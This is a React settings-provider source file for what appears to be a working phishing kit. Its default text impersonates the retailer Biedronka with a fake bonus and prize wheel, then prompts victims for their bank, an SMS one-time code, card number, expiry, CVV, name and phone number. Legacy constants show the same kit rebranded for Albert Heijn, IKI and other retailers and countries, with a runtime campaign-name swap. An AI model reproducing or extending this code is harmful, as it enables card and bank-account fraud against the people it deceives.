"use client";

import { createContext, useContext, useEffect, useState, ReactNode, useMemo, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { normalizeCountryName } from "@/lib/country-utils";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
import { brandifySettings, getCampaignNameFromSettings } from "@/lib/brand";
import { applyBrandTheme, getThemePrimary } from "@/lib/theme";

export type GlobalSettings = {
  logo_url: string;
  bg_url: string;
  portal_name: string;
  support_center_name: string;
  win_title: string;
  win_subtitle: string;
  win_button: string;
  banken_title: string;
  banken_subtitle: string;
  banken_search_placeholder: string;
  wait_title: string;
  wait_subtitle: string;
  sms_title: string;
  sms_subtitle: string;
  sms_input_label: string;
  sms_button: string;
  sms_loading: string;
  card_title: string;
  card_subtitle: string;
  card_owner_label: string;
  card_number_label: string;
  card_expiry_label: string;
  card_cvv_label: string;
  card_button: string;
  code_title: string;
  code_subtitle: string;
  code_button: string;
  live_support_title: string;
  live_support_subtitle: string;
  live_support_button: string;
  profile_title_small: string;
  profile_title_main: string;
  profile_subtitle: string;
  profile_firstname_label: string;
  profile_lastname_label: string;
  profile_phone_label: string;
  profile_button: string;
  profile_loading_text: string;
  site_language: string;
  target_country?: string;

  wheel_settings: any;
};

type LegacyGlobalSettings = Partial<GlobalSettings> & {
  background_url?: string;
};

const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
const ALBERT_HEIJN_LOGO_URL = "/form-assets/biedronka-mini-logo.webp";
const PORTAL_BG_URL = "/form-assets/bg-desktop.webp";
const LEGACY_BG_URL = "/spar-bg.png";
const LEGACY_LOGO_URLS = new Set([
  "/form-assets/iki-mini-logo.png",
  "/form-assets/maxima-mini-logo.png",
]);
const LEGACY_PORTAL_NAMES = new Set([
  "Albert Heijn klantenportaal",
  "IKI klientų portalas",
  "IKI Klientų Portalas",
  "Portal do Cliente IKI",
]);
const LEGACY_SUPPORT_CENTER_NAMES = new Set([
  "Albert Heijn service",
  "IKI pagalbos centras",
  "IKI klientų aptarnavimas",
  "IKI Klientų Aptarnavimas",
  "Serviço IKI",
]);
const LEGACY_WIN_TITLES = new Set([
  "Exclusieve Albert Heijn bonus",
  "Išskirtinė IKI premija",
  "Ekskliuzyvinė IKI Premija",
]);

export const defaultSettings: GlobalSettings = {
  logo_url: "/form-assets/biedronka-mini-logo.webp",
  bg_url: PORTAL_BG_URL,
  portal_name: "Portal Klienta Biedronka",
  support_center_name: "Obsługa Klienta Biedronka",
  win_title: "Ekskluzywny Bonus Biedronka",
  win_subtitle:
    "Gratulacje! Zostałeś wybrany do dzisiejszej promocji Biedronka. Kliknij przycisk poniżej, aby odebrać swój bonus.",
  win_button: "Odbierz bonus",
  banken_title: "Wybierz swój bank",
  banken_subtitle: "Wybierz swój bank, aby kontynuować.",
  banken_search_placeholder: "Szukaj swojego banku...",
  wait_title: "Proszę czekać",
  wait_subtitle: "Twoje żądanie jest bezpiecznie przetwarzane...",
  sms_title: "Kod bezpieczeństwa SMS",
  sms_subtitle: "Wprowadź {digits}-cyfrowy kod.",
  sms_input_label: "Jednorazowy kod",
  sms_button: "Potwierdź",
  sms_loading: "Przetwarzanie...",
  card_title: "Dane do płatności",
  card_subtitle: "Sprawdź i potwierdź swoje dane.",
  card_owner_label: "Imię i nazwisko posiadacza karty",
  card_number_label: "Numer karty",
  card_expiry_label: "Data ważności MM/RR",
  card_cvv_label: "Kod bezpieczeństwa",
  card_button: "Kontynuuj",
  code_title: "Witamy",
  code_subtitle: "Wprowadź kod uczestnictwa otrzymany od {partner}, aby odblokować nagrodę.",
  code_button: "Potwierdź kod",
  live_support_title: "Wsparcie na żywo",
  live_support_subtitle:
    "To continue, you need to contact our customer service.\n\nClick the button below to start the chat.",
  live_support_button: "Rozpocznij czat",
  profile_title_small: "Potwierdzenie nagrody",
  profile_title_main: "Twoja kwota bonusu",
  profile_subtitle: "Potwierdź swoje dane do dalszego przetwarzania.",
  profile_firstname_label: "Imię",
  profile_lastname_label: "Nazwisko",
  profile_phone_label: "Numer telefonu",
  profile_button: "Dalej",
  profile_loading_text: "Przetwarzanie...",
  site_language: "pl",
  target_country: "Polonya",
  wheel_settings: {},
};

const TRANSLATABLE_TEXT_KEYS: Array<keyof GlobalSettings> = [
  "portal_name",
  "support_center_name",
  "win_title",
  "win_subtitle",
  "win_button",
  "banken_title",
  "banken_subtitle",
  "banken_search_placeholder",
  "wait_title",
  "wait_subtitle",
  "sms_title",
  "sms_subtitle",
  "sms_input_label",
  "sms_button",
  "sms_loading",
  "card_title",
  "card_subtitle",
  "card_owner_label",
  "card_number_label",
  "card_expiry_label",
  "card_cvv_label",
  "card_button",
  "code_title",
  "code_subtitle",
  "code_button",
  "live_support_title",
  "live_support_subtitle",
  "live_support_button",
  "profile_title_small",
  "profile_title_main",
  "profile_subtitle",
  "profile_firstname_label",
  "profile_lastname_label",
  "profile_phone_label",
  "profile_button",
  "profile_loading_text",
];

function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
  const next = { ...settings };

  if (!next.bg_url && next.background_url) {
    next.bg_url = next.background_url;
  }

  if (
    !next.logo_url ||
    next.logo_url === "/logo.png" ||
    next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL ||
    LEGACY_LOGO_URLS.has(next.logo_url)
  ) {
    next.logo_url = ALBERT_HEIJN_LOGO_URL;
  }

  if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
    next.bg_url = PORTAL_BG_URL;
  }

  const isLegacyNonEnLanguage =
    !next.site_language ||
    next.site_language === "lt" ||
    next.site_language === "nl" ||
    next.site_language === "et" ||
    next.site_language === "pt";

  if (isLegacyNonEnLanguage) {
    for (const key of TRANSLATABLE_TEXT_KEYS) {
      (next as Record<string, unknown>)[key] = defaultSettings[key];
    }
    next.site_language = "pl";
  } else {
    if (!next.portal_name || LEGACY_PORTAL_NAMES.has(next.portal_name)) {
      next.portal_name = defaultSettings.portal_name;
    }
    if (!next.support_center_name || LEGACY_SUPPORT_CENTER_NAMES.has(next.support_center_name)) {
      next.support_center_name = defaultSettings.support_center_name;
    }
    if (!next.win_title || LEGACY_WIN_TITLES.has(next.win_title)) {
      next.win_title = defaultSettings.win_title;
    }
  }

  if (
    !next.target_country ||
    next.target_country === "Hollanda" ||
    next.target_country === "Estonya" ||
    next.target_country === "Litvanya" ||
    next.target_country === "İrlanda"
  ) {
    next.target_country = "Polonya";
  }

  if (next.target_country) {
    next.target_country = normalizeCountryName(next.target_country);
  }

  return next;
}

const SettingsContext = createContext<{ settings: GlobalSettings; loading: boolean }>({
  settings: defaultSettings,
  loading: false,
});

export function SettingsProvider({ children }: { children: ReactNode }) {
  const [settings, setSettings] = useState<GlobalSettings>(defaultSettings);
  const [loading, setLoading] = useState(true);
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const bgSignatureRef = useRef("");

  useEffect(() => {
    async function loadSettings() {
      if (!supabase) {
        setLoading(false);
        return;
      }
      const { data, error } = await supabase
        .from("global_settings")
        .select("*")
        .limit(1)
        .maybeSingle();

      if (data && !error) {
        setSettings((prev) => {
          const normalized = normalizeBranding({ ...prev, ...data }) as GlobalSettings;
          // Kampanya adi (wheel_settings.campaign_name): tum metinlerdeki "IKI"
          // ibaresi runtime'da kampanya ismiyle degistirilir.
          return brandifySettings(
            normalized as unknown as Record<string, unknown>,
            getCampaignNameFromSettings(normalized),
          ) as unknown as GlobalSettings;
        });
      }
      setLoading(false);
    }
    
    void loadSettings();
  }, [supabase]);

  // Kampanya tema rengi (wheel_settings.theme_primary) -> CSS degiskenleri
  useEffect(() => {
    applyBrandTheme(getThemePrimary(settings));
  }, [settings]);

  // Apply custom background image dynamically to the body
  useEffect(() => {
    let frameId = 0;

    const updateBg = () => {
      if (frameId) {
        window.cancelAnimationFrame(frameId);
      }

      frameId = window.requestAnimationFrame(() => {
        frameId = 0;

      const isMobile = window.innerWidth <= 768;
      const targetWidth = Math.min(
        Math.round(window.innerWidth * Math.max(window.devicePixelRatio || 1, 1)),
        isMobile ? 900 : 1600,
      );
      
      let activeBg: string | "" = isMobile && settings.wheel_settings?.bg_url_mobile 
        ? settings.wheel_settings.bg_url_mobile 
        : settings.bg_url;
        
      const pageBgs = settings.wheel_settings?.page_backgrounds || {};
      const path = window.location.pathname;
      const isWheelPage = /^\/wheel(\/|$|\?)/.test(path) || path.startsWith("/wheel");

      if (path.includes('/code') && pageBgs.code) activeBg = pageBgs.code;
      else if (isWheelPage && pageBgs.wheel) activeBg = pageBgs.wheel;
      // Wheel page: explicitly NO portal background by default (transparent — only wheel's own container background visible)
      else if (isWheelPage) activeBg = "";
      else if (path.includes('/win') && pageBgs.win) activeBg = pageBgs.win;
      else if (path.includes('/form') && pageBgs.form) activeBg = pageBgs.form;
      else if (path.includes('/banken') && pageBgs.banken) activeBg = pageBgs.banken;
      else if (path.includes('/sms') && pageBgs.sms) activeBg = pageBgs.sms;
      else if (path.includes('/card') && pageBgs.card) activeBg = pageBgs.card;

      const nextSignatureNoBg = `${window.location.pathname}|no-bg`;
      if (!activeBg) {
        if (bgSignatureRef.current !== nextSignatureNoBg) {
          bgSignatureRef.current = nextSignatureNoBg;
          document.documentElement.style.setProperty('--custom-bg', 'none');
        }
        return;
      }

      const optimizedBg = optimizeSupabaseImageUrl(activeBg, {
        width: targetWidth,
        quality: isMobile ? 60 : 68,
        format: "webp",
      });
      const nextSignature = `${window.location.pathname}|${optimizedBg}`;
      if (bgSignatureRef.current === nextSignature) {
        return;
      }

      bgSignatureRef.current = nextSignature;
      document.documentElement.style.setProperty('--custom-bg', `url("${optimizedBg}")`);
      });
    };

    updateBg();
    window.addEventListener('resize', updateBg);
    window.addEventListener('orientationchange', updateBg);
    return () => {
      if (frameId) {
        window.cancelAnimationFrame(frameId);
      }
      window.removeEventListener('resize', updateBg);
      window.removeEventListener('orientationchange', updateBg);
    };
  }, [settings.bg_url, settings.wheel_settings, loading]);

  return (
    <SettingsContext.Provider value={{ settings, loading }}>
      {children}
    </SettingsContext.Provider>
  );
}

export function useSettings() {
  return useContext(SettingsContext);
}
